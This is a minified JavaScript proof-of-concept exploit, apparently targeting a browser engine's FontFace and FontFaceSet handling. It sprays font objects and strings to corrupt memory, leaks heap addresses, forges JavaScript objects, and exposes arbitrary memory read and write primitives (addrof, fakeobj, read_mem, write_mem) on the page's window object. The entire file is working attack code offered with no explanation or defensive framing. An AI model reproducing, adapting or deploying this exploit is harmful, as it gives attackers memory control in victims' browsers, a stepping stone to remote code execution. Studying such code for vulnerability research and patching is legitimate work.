var PAGE_SIZE=16384,SIZEOF_CSS_FONT_FACE=184,HASHMAP_BUCKET=208,STRING_OFFSET=20,SPRAY_FONTS=4106,GUESS_FONT=8594325504,NPAGES=20,INVALID_POINTER=0,HAMMER_FONT_NAME="font8",HAMMER_NSTRINGS=700;function poc(){function a(a){return"number"==typeof a?"0x"+new Number(a).toString(16):""+a}function b(a){for(var b="",c=0;8>c;c++)b+=String.fromCharCode(a%256),a=(a-a%256)/256;return b}function c(a,b){b===void 0&&(b=0);for(var c=0,d=7;0<=d;d--)c=256*c+a.charCodeAt(b+d);return c}function d(a,b){var c=b+"\0".repeat(a-STRING_OFFSET-8-b.length)+v++;return u[c]=1,w.push(c),c}function e(a,c){var f="";f+="0000",f+="\xFF\0\0\0\xFF\xFF\xFF\xFF",f+=b(a),f+=b(2147483668),B="",B+=b(29),B+=b(F),B+=b(F+SIZEOF_CSS_FONT_FACE),B+=b(F+2*SIZEOF_CSS_FONT_FACE);for(var g=0;18>g;g++)B+=b(INVALID_POINTER);for(var g=0;256>g;g++)d(HASHMAP_BUCKET,B);ffses[c]=new FontFaceSet([p[E],p[E+1],p[E+2],r]);d(HASHMAP_BUCKET,B);var h=d(HASHMAP_BUCKET,f);return p[E].family=c+"_evil1",p[E+1].family=c+"_evil2",p[E+2].family=c+"_evil3",H.push(h),1e3>h.length?e(a,c+"_"):h}function f(a){return s[257][32]=a,o[0]=s[258][0],4294967296*n[1]+n[0]}function g(a){return n[0]=a,n[1]=(a-a%4294967296)/4294967296,s[258][0]=o[0],s[257][32]}function h(b,c){c[4]=0|b,c[5]=0|b/4294967296}function j(b){return b[4]+4294967296*b[5]}function k(a,b){h(a,aa),aa[6]=b}for(var l=new ArrayBuffer(8),m=new Uint8Array(l),n=new Uint32Array(l),o=new Float64Array(l),p=[],q=0;q<SPRAY_FONTS;q++)p.push(new FontFace("font1","",{}));var r=new FontFace("font2","url(data:text/html,)",{});p.push(r);for(var s=[],q=0;512>q;q++)s.push(Array(31));s[256][0]=1.5,s[257][0]={},s[258][0]=1.5;var t={a:s[256],b:new Uint32Array(1),c:!0},u={},v=1e7,w=[],x=GUESS_FONT,y=!0,z=0,A=0;window.ffses={};do{for(var B=b(NPAGES+2),q=0;q<NPAGES;q++)B+=b(x+q*PAGE_SIZE);B+=b(INVALID_POINTER);for(var q=0;256>q;q++)d(HASHMAP_BUCKET,B);for(var C=ffses["search_"+ ++A]=new FontFaceSet(p),D=d(HASHMAP_BUCKET,B),E=null,F=null,q=0;q<SPRAY_FONTS;q++)if(p[q].family="search"+A,D.substr(0,B.length)!=B){E=q;for(var G=D.substr(0,B.length),q=1;q<=NPAGES;q++)if(G.substr(8*q,8)!=B.substr(8*q,8)){F=c(B.substr(8*q,8));break}0==z++&&(x=F+32768,F=null);break}(y=!y)&&(x+=NPAGES*PAGE_SIZE)}while(null===F);print("guessed fontface addr: "+E+" -> "+a(F));var B="";B+=b(26),B+=b(F),B+=b(F+SIZEOF_CSS_FONT_FACE);for(var q=0;19>q;q++)B+=b(INVALID_POINTER);for(var q=0;256>q;q++)d(HASHMAP_BUCKET,B);for(var H=[],q=0;;q++){var I=ffses["ffs_leak_"+q]=new FontFaceSet([p[E],p[E+1],r]),J=d(HASHMAP_BUCKET,B);H.push(d(HASHMAP_BUCKET,B)),p[E].family="evil2",p[E+1].family="evil3";var K=c(J.substr(J.length-8));if(281474976710656>K)break}print("stringimpl leak: "+a(K));var L=e(K,"ffs3");print("fastmalloc.length = "+L.length);for(var q=0;1e5>q;q++)d(128,"");for(var M=[],q=0;65536>q;q++)M.push({value:1094927426}),M.push({value:t});for(var N=null;null===N;){Object.defineProperties({},M);for(var q=L.indexOf("BDCA\0\0\xFE\xFF");;q++)if(66==L.charCodeAt(q)&&68==L.charCodeAt(q+1)&&67==L.charCodeAt(q+2)&&65==L.charCodeAt(q+3)&&0==L.charCodeAt(q+4)&&0==L.charCodeAt(q+5)&&254==L.charCodeAt(q+6)&&255==L.charCodeAt(q+7)&&14==L.charCodeAt(q+24)){N=c(L,q+32);break}}print("jsvalue leak: "+t+" -> "+a(N));var O=e(N,"ffs4"),P=c(O,16),Q=c(O,24),R=c(O,32);print("array256="+a(P)+" ui32a="+a(Q)+" sanity="+a(R));for(var S=e(P,"ffs5"),T=c(S,8),U=e(Q,"ffs6"),q=0;8>q;q++)m[q]=U.charCodeAt(q);var V=n[0],W=n[1];print("butterfly="+a(T)+" structureid="+V),n[0]=65536,n[1]=0,s[257][1]={},s[257][0]=o[0],n[0]=0|F+12*SIZEOF_CSS_FONT_FACE,n[1]=(F-F%4294967296)/4294967296,s[256][q]=o[0],pp_s="",pp_s+=b(56);for(var q=0;12>q;q++)pp_s+=b(F+q*SIZEOF_CSS_FONT_FACE);var X="";X+="0000",X+=b(INVALID_POINTER),X+=b(T),X+="\0\0\0\0\"\0\0\0";for(var Y=[],q=0;12>q;q++)Y.push(p[E+q]);Y.push(r);for(var Z=[p[E+12]],q=0;5>q;q++)Z.push(new FontFace(HAMMER_FONT_NAME,"url(data:text/html,)",{}));for(var q=0;q<HAMMER_NSTRINGS;q++)d(HASHMAP_BUCKET,pp_s);ffses.ffs7=new FontFaceSet(Y);d(HASHMAP_BUCKET,pp_s);var $=ffses.ffs8=new FontFaceSet(Z),_=d(HASHMAP_BUCKET,X);H.push(_);for(var q=0;13>q;q++)p[E+q].family="hammer"+q;print("arrays[257].length="+s[257].length),print("addrof(null)="+f(null)+" fakeobj(10)="+g(10));var aa=new Uint32Array(8),ba=new Uint8Array(1),ca=new Uint32Array(8),da={obj:null},ea=f(ba),fa=f(da);n[0]=V,n[1]=W,m[6]=7;var ga={jscell:o[0],butterfly:!0,buffer:aa,size:22136};window.addrof=function(a){return da.obj=a,j(ca)},window.fakeobj=function(a){return h(a,ca),da.obj},window.read_mem=function(a,b){k(a,b);for(var c=[],d=0;d<b;d++)c.push(ba[d]);return c},window.read_mem_s=function(a,b){return k(a,b),""+ba},window.read_mem_b=function(a,c){k(a,c);var d=new Uint8Array(c);return d.set(ba),d},window.read_mem_as_string=function(a,b){for(var c=read_mem_b(a,b),d="",e=0;e<c.length;e++)d+=String.fromCharCode(c[e]);return d},window.ref_mem=function(a,b){return k(a,b),ba},window.write_mem=function(a,b){k(a,b.length);for(var c=0;c<b.length;c++)ba[c]=b[c]},window.read_ptr_at=function(a){for(var b=0,c=read_mem(a,8),d=7;0<=d;d--)b=256*b+c[d];return b},window.write_ptr_at=function(a,b){for(var c=[],e=0;8>e;e++)c.push(255&b),b/=256;write_mem(a,c)},window.hex=a,function(){var a=g(f(ga)+16);a[4]=ea,a[5]=(ea-ea%4294967296)/4294967296,ga.buffer=ca,a[4]=fa,a[5]=(fa-fa%4294967296)/4294967296,a=null}(),print(read_mem(addrof(ga),48)),function(){var a=read_ptr_at(addrof(_)+8)-208;write_mem(a,read_mem(a-96,208));for(var b,c=0;c<H.length;c++)b=read_ptr_at(addrof(H[c])+8),write_ptr_at(b,4294967296*(HASHMAP_BUCKET-20)+1),write_ptr_at(b+8,b+20),write_ptr_at(b+16,2147483668),print(H[c]);write_ptr_at(T+248,133143986207)}()}poc();